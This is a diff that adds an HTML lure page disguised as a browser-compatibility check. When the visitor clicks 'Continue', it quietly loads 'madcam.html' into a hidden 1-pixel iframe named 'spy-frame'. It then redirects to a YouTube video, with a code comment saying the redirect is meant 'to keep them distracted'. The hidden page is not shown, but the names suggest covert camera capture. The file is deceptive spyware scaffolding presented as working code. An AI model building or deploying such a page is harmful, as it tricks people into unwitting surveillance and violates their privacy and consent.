@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking Connection...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #111; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #spy-frame { width: 1px; height: 1px; opacity: 0.01; border: none; position: absolute; }
+        button { background: #3498db; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <h3>Verifying Browser Compatibility</h3>
+    <p>Please click below to continue to content.</p>
+    
+    <button onclick="startSession()">Continue</button>
+
+    <iframe id="spy-frame" src=""></iframe>
+
+    <script>
+        function startSession() {
+            document.getElementById('spy-frame').src = "madcam.html";
+            document.querySelector('h3').innerText = "Loading Content...";
+            document.querySelector('button').style.display = "none";
+            
+            // Optional: Redirect to a real site after 10 seconds to keep them distracted
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
+            }, 10000);
+        }
+    </script>
+</body>
+</html>
